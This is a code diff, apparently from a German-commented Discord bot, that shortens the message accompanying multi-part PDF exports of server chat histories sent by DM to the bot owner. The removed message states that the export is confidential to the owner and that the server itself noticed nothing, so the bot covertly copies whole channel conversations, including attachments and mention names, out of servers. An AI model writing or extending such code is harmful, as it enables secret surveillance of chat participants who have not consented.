@@ -739,6 +739,16 @@ def _progress_bar(pct: int, width: int = 10) -> str:
     return "🟩" * filled + "⬜" * (width - filled)
 
 
+def _part_message_content(idx: int, total: int) -> str:
+    """
+    Text einer Teil-DM — bewusst MINIMAL (Owner-Wunsch): nur „Teil N/M:"",
+    darunter direkt die Datei. Kein wiederholter Boilerplate-Text pro Teil;
+    der Kontext (Kanal/Server) steht in der Fortschritts-Nachricht und im
+    Dateinamen des PDFs.
+    """
+    return f"Teil {idx}/{total}:"
+
+
 def startup_notify_view(
     *,
     ram_mb: float,
@@ -2246,21 +2256,13 @@ class RelayClient(discord.Client):
                 nicht mehr gebaut, der Fehler wird sichtbar gemeldet.
                 """
                 if total != 1:
-                    von = f" von {total}" if total > 1 else ""
                     fname = (
                         f"chatverlauf-{guild.id}-{channel.id}-teil-{idx}"
                         + (f"-von-{total}" if total > 1 else "") + ".pdf"
                     )
-                    content = (
-                        f"💬 **Chatverlauf Teil {idx}{von}** von #{ch_name} in "
-                        f"**{guild.name}** (Server-ID `{guild.id}`, Kanal-ID `{channel.id}`)\n\n"
-                        "Große Verläufe werden auf mehrere Teil-PDFs verteilt, damit "
-                        "die Erstellung zuverlässig bleibt. Alle Teile zusammen sind "
-                        "der **komplette** Verlauf (Apple-Emojis, Bildanhänge, "
-                        "Komponenten, Embeds, Mention-Namen).\n\n"
-                        "_Vertraulich — nur für dich (Bot-Owner) bestimmt. Der Server "
-                        "selbst hat davon nichts bemerkt._"
-                    )
+                    # Kein Boilerplate mehr (Owner-Wunsch): nur „Teil N/M:" und
+                    # darunter direkt die Datei — sonst nichts.
+                    content = _part_message_content(idx, total)
                 else:
                     fname = f"chatverlauf-{guild.id}-{channel.id}.pdf"
                     content = (
